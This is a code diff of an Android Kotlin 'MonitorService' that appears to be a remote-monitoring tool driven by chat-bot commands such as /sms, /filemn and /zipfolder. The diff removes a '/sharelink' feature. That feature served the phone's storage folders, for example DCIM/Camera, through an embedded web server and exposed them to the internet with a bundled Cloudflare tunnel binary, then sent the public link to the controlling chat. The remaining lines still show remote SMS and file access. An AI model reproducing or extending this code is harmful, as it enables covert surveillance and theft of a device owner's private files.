@@ -44,12 +44,7 @@ import okhttp3.Request
 import okhttp3.RequestBody.Companion.asRequestBody
 import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONObject
-import fi.iki.elonen.NanoHTTPD
-import fi.iki.elonen.NanoHTTPD.IHTTPSession
-import fi.iki.elonen.NanoHTTPD.Response
-import fi.iki.elonen.NanoHTTPD.Response.Status
 import java.io.File
-import java.io.FileInputStream
 import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
@@ -101,11 +96,6 @@ class MonitorService : LifecycleService() {
 
     private val fileCache       = mutableMapOf<String, List<FileEntry>>()
     private val folderFileCache = mutableMapOf<String, List<File>>()
-
-    // ── Sharelink state ──
-    private var nanoServer: NanoHTTPD? = null
-    private var cloudflaredProcess: Process? = null
-    private val SHARE_PORT = 8765
 
     // ── WakeLock ──
     private var wakeLock: PowerManager.WakeLock? = null
@@ -173,7 +163,6 @@ class MonitorService : LifecycleService() {
         heartbeatJob?.cancel()
         serviceScope.cancel()
         cameraExecutor.shutdown()
-        stopShareInternal()
         releaseWakeLock()
     }
 
@@ -371,16 +360,6 @@ class MonitorService : LifecycleService() {
             text.startsWith("/sms ")               -> handleSms(chatId, rawText.removePrefix("/sms ").trim())
             text == "/filemn"                      -> handleFileMn(chatId, "")
             text.startsWith("/filemn ")            -> handleFileMn(chatId, rawText.removePrefix("/filemn ").trim())
-            text == "/sharelink"                   -> sendMessage(chatId,
-                "${devicePrefix()}ℹ️ *Usage:*\n`/sharelink <folderPath>`\n`/sharelink <folderPath> <number>`\n_Example:_ /sharelink DCIM/Camera",
-                parseMode = "Markdown")
-            text.startsWith("/sharelink ") -> {
-                val arg   = rawText.removePrefix("/sharelink ").trim()
-                val parts = arg.split(" ")
-                val num   = if (parts.size >= 2) parts.last().toIntOrNull() else null
-                if (num != null) handleShareSingleFile(chatId, num) else handleShareLink(chatId, parts[0])
-            }
-            text == "/stopshare"                   -> handleStopShare(chatId)
             text == "/zipfolder"                   -> sendMessage(chatId,
                 "${devicePrefix()}ℹ️ *Usage:*\n`/zipfolder <folder>`\n`/zipfolder <folder> 1 3 7`",
                 parseMode = "Markdown")
@@ -523,12 +502,6 @@ class MonitorService : LifecycleService() {
             /filemn                   — All root folders
             /filemn <folder>          — Browse folder
             /filemn <folder> <number> — Send file
-
-            ─────────────────────────
-            🌐 *Share Link*
-            /sharelink <folder>       — Private download link
-            /sharelink <folder> <num> — Share one file
-            /stopshare                — Stop share server
 
             ─────────────────────────
             🗜️ *ZIP*
@@ -948,109 +921,6 @@ class MonitorService : LifecycleService() {
         }
         true
     } catch (_: Exception) { false }
-
-    // ══════════════════════════════════════════════════════════════════════════
-    //  SHARELINK — NanoHTTPD + Cloudflare Tunnel
-    // ══════════════════════════════════════════════════════════════════════════
-
-    private fun handleShareLink(chatId: String, folderPath: String) {
-        val target = resolveFolder(Environment.getExternalStorageDirectory(), folderPath)
-        if (target == null) { sendMessage(chatId, "${devicePrefix()}❌ Folder `$folderPath` not found.", parseMode = "Markdown"); return }
-        val files = target.walkTopDown().filter { it.isFile }.toList()
-        if (files.isEmpty()) { sendMessage(chatId, "${devicePrefix()}❌ Folder is empty."); return }
-        sendMessage(chatId, "${devicePrefix()}🌐 Starting share server for `$folderPath`…\n📊 ${files.size} files, ${formatSize(files.sumOf { it.length() })}", parseMode = "Markdown")
-        serviceScope.launch {
-            stopShareInternal(); startNanoServer(target, files)
-            val url = startCloudflaredTunnel(chatId) ?: return@launch
-            sendMessage(chatId, "${devicePrefix()}✅ *Share link ready!*\n\n🔗 $url\n\n📂 ${files.size} files\n⚠️ Temporary link\n\n/stopshare to close.", parseMode = "Markdown")
-        }
-    }
-
-    private fun handleShareSingleFile(chatId: String, number: Int) {
-        val cached = folderFileCache[chatId]
-        if (cached.isNullOrEmpty()) { sendMessage(chatId, "${devicePrefix()}⚠️ Use /filemn <folder> first."); return }
-        val idx = number - 1
-        if (idx < 0 || idx >= cached.size) { sendMessage(chatId, "${devicePrefix()}❌ Choose 1–${cached.size}."); return }
-        val file = cached[idx]
-        sendMessage(chatId, "${devicePrefix()}🌐 Starting share for *${file.name}* (${formatSize(file.length())})…", parseMode = "Markdown")
-        serviceScope.launch {
-            stopShareInternal(); startNanoServer(null, listOf(file))
-            val url = startCloudflaredTunnel(chatId) ?: return@launch
-            sendMessage(chatId, "${devicePrefix()}✅ *Share link ready!*\n\n🔗 $url/${file.name}\n\n📎 ${file.name}\n/stopshare to close.", parseMode = "Markdown")
-        }
-    }
-
-    private fun handleStopShare(chatId: String) {
-        stopShareInternal()
-        sendMessage(chatId, "${devicePrefix()}🛑 Share server stopped.")
-    }
-
-    private fun stopShareInternal() {
-        try { nanoServer?.stop(); nanoServer = null } catch (_: Exception) {}
-        try { cloudflaredProcess?.destroy(); cloudflaredProcess = null } catch (_: Exception) {}
-    }
-
-    private fun startNanoServer(folder: File?, files: List<File>) {
-        val server = object : NanoHTTPD(SHARE_PORT) {
-            override fun serve(session: IHTTPSession): Response {
-                val uri = session.uri.trimStart('/')
-                if (uri.isEmpty()) {
-                    val sb = StringBuilder()
-                    sb.append("<html><head><meta charset='utf-8'><title>Files</title>")
-                    sb.append("<style>body{font-family:sans-serif;padding:20px;background:#111;color:#eee}")
-                    sb.append("a{color:#4af;text-decoration:none;font-size:18px}a:hover{text-decoration:underline}")
-                    sb.append("li{padding:8px 0;border-bottom:1px solid #333}</style></head>")
-                    sb.append("<body><h2>📂 ${folder?.name ?: "Files"}</h2><ul>")
-                    files.forEach { f -> sb.append("<li><a href='/${f.name}'>📄 ${f.name}</a> <small style='color:#888'>${formatSize(f.length())}</small></li>") }
-                    sb.append("</ul></body></html>")
-                    return newFixedLengthResponse(Status.OK, "text/html", sb.toString())
-                }
-                val file = files.firstOrNull { it.name == uri }
-                    ?: return newFixedLengthResponse(Status.NOT_FOUND, "text/plain", "File not found")
-                val mime = MimeTypeMap.getSingleton().getMimeTypeFromExtension(file.extension.lowercase()) ?: "application/octet-stream"
-                return try {
-                    newChunkedResponse(Status.OK, mime, FileInputStream(file)).also {
-                        it.addHeader("Content-Disposition", "attachment; filename=\"${file.name}\"")
-                        it.addHeader("Content-Length", file.length().toString())
-                    }
-                } catch (e: Exception) { newFixedLengthResponse(Status.INTERNAL_ERROR, "text/plain", "Error: ${e.message}") }
-            }
-        }
-        server.start(NanoHTTPD.SOCKET_READ_TIMEOUT, false)
-        nanoServer = server
-    }
-
-    private fun startCloudflaredTunnel(chatId: String): String? = try {
-        val cfBinary = File(filesDir, "cloudflared")
-        if (!cfBinary.exists()) {
-            assets.open("cloudflared").use { input -> cfBinary.outputStream().use { input.copyTo(it) } }
-        }
-        cfBinary.setExecutable(true, false)
-        val process = ProcessBuilder(cfBinary.absolutePath, "tunnel", "--url", "http://localhost:$SHARE_PORT")
-            .redirectErrorStream(true).start()
-        cloudflaredProcess = process
-        val reader   = process.inputStream.bufferedReader()
-        val urlRegex = Regex("https://[a-z0-9\\-]+\\.trycloudflare\\.com")
-        val deadline = System.currentTimeMillis() + 30_000L
-        var url: String? = null
-        while (System.currentTimeMillis() < deadline) {
-            val line = reader.readLine() ?: break
-            val match = urlRegex.find(line)
-            if (match != null) { url = match.value; break }
-        }
-        if (url == null) { sendMessage(chatId, "${devicePrefix()}❌ Tunnel failed to start."); stopShareInternal() }
-        url
-    } catch (e: Exception) { sendMessage(chatId, "${devicePrefix()}❌ Tunnel error: ${e.message}"); null }
-
-    private fun resolveFolder(root: File, folderPath: String): File? {
-        val direct = File(root, folderPath)
-        if (direct.exists() && direct.isDirectory) return direct
-        var current = root
-        for (segment in folderPath.split("/")) {
-            current = current.listFiles()?.firstOrNull { it.name.lowercase() == segment.lowercase() && it.isDirectory } ?: return null
-        }
-        return current
-    }
 
     // ══════════════════════════════════════════════════════════════════════════
     //  ZIP
